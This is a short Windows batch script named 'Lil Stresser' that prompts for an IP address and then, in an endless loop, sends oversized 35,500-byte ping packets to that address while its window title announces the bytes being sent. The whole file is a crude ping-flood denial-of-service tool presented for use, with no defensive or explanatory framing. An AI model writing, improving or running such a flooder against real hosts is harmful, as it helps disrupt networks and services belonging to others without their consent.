@echo off
mode con lines=30 cols=120
chcp 65001
cls
color 1
title Lil Stresser
echo.
set /p IP=Enter IP:
:top
 
:loop
ping %IP% -l 35500 -w 1 -n 1
cls
title                        Purge SENDING 35500 BYTES TO:%IP%
goto :loop

